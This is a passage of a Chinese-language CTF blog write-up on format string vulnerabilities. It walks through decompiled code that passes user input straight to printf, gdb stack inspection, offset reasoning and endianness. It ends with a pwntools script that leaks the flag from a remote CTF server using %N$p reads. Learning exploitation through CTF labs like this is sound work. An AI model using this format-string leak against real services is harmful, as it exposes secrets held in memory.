+  <span class="token function">HIBYTE</span><span class="token punctuation">(</span>v11<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Echo as a service"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">gets</span><span class="token punctuation">(</span>format<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span>format<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>简单审一下代码，先是把flag读到了变量s里面，后面直接<code>printf(format);</code>，明显存在格式化字符串漏洞</p>
+<p>接下来得用gdb了，本地先建一个flag.txt方便查看文件在栈中的地址</p>
+<p>然后<code>gdb</code>进入调试，<code>r</code>开始运行，先随便输入点字符串 AAAAAAAAAA 进去</p>
+<p>接着<code>ctrl+c</code>暂停，输入stack查看栈</p>
+<p><img src="/blog/2024/05/03/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20240504001824367.png" alt="image-20240504001824367"></p>
+<p>可以看到这里的AAAAAAAA就是我们在gets中输入的值，位置在<code>0x7fffffffdc40</code>；而flag在<code>0x7fffffffdc60</code>，</p>
+<p>（yysy这里我还是不懂）flag和格式化字符串的偏移是 <code>12</code>（大概是<code>(0x60-0x40) / 8 + 8</code>？），这里涉及到64位和32位栈传参的区别：</p>
+<ul>
+<li>32位传参：在栈上传参，并且根据system和call system调用的不同，参数和函数地址的偏移	也不同，esp eip eax ebx等是32位特有</li>
+<li>64位传参：寄存器以r开头，例如rsp</li>
+<li>在linux操作系统中，前六个参数通过 RDI 、 RSI 、 RDX 、 RCX 、 R8 和 R9 传递；而在windows操作系统中，前四个参数通过 RCX 、 RDX 、 R8 和 R9 来传递。他们的共同点是，其第七个&#x2F;第五个参数就 push 入栈进行传递</li>
+</ul>
+<p>接下来用<code>%12$p</code>读出来</p>
+<p><img src="/blog/2024/05/03/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20240504005706323.png" alt="image-20240504005706323"></p>
+<p>16进制解码得到<code>set&#123;galf</code></p>
+<p>顺带解释两个问题：</p>
+<ol>
+<li><p>用<code>%p</code>：%p是打印出所指栈位置中的地址指向的地方的内容，而栈中是不会存储字符串的，我们给system传参的时候是binsh字符串的地址，而不是binsh字符串，所以，看起来flag是存储到了栈中，其实只是它的地址被保存到了栈中</p>
+</li>
+<li><p>字符串倒转：大小端序的问题，大端序将数据的低位字节存放在内存的高位地址，高位字节存放在低位地址；小端序将一个多位数的低位放在较小的地址处，高位放在较大的地址处。<strong>而计算机的内部处理都是小端字节序</strong>；<strong>在计算机内部，小端序被广泛应用于现代 CPU 内部存储数据；而在其他场景，比如网络传输和文件存储则使用大端序</strong></p>
+<p><img src="/blog/2024/05/03/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20240504005954115.png" alt="image-20240504005954115"></p>
+<p>上图为小端序的存储状况，作为高位字节的12就放在了低地址</p>
+</li>
+</ol>
+<p>于是继续读下一个偏移的地址：<code>%13$p</code>，得到<code>&#125;t</code>，逆序过来就是我们预设的flag：<code>flag&#123;test&#125;</code></p>
+<p>所以接下来打远程，exp：参考<a target="_blank" rel="noopener" href="https://www.nssctf.cn/note/set/3689">https://www.nssctf.cn/note/set/3689</a></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
+
+<span class="token comment"># p = process('./fmt')</span>
+p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node5.anna.nssctf.cn'</span><span class="token punctuation">,</span> <span class="token number">23944</span><span class="token punctuation">)</span>
+
+<span class="token comment"># get flag</span>
+flag_addr <span class="token operator">=</span> <span class="token number">12</span>
+flag <span class="token operator">=</span> <span class="token string">''</span>
+<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Echo as a service'</span><span class="token punctuation">,</span> <span class="token string">'%&#123;&#125;$p'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>flag_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'0x'</span><span class="token punctuation">)</span>
+    part <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>part<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        index <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>part<span class="token punctuation">)</span> <span class="token operator">-</span> i
+        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>part<span class="token punctuation">[</span>index <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">:</span>index<span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">b'0'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token string">'&#125;'</span> <span class="token keyword">in</span> flag<span class="token punctuation">:</span>
+        <span class="token keyword">break</span>
+    flag_addr <span class="token operator">+=</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h2 id="任意内存的读取及任意内存写入"><a href="#任意内存的读取及任意内存写入" class="headerlink" title="任意内存的读取及任意内存写入"></a>任意内存的读取及任意内存写入</h2>
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            </div>
+        </transition>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/blog/js/main.js"></script>
+    
+    
+
+
+
+
+    
+    
+
+<div id="vcomments"></div>
+
+<script src="/blog/js/lib/valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
+        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
+        visitor: 'true',
+        placeholder: '写点什么吧(●ˇ∀ˇ●)',
+        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
+    });
+</script>
+
+    <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2025 雲流のLowest World
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;C1oudfL0w0
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+</html>
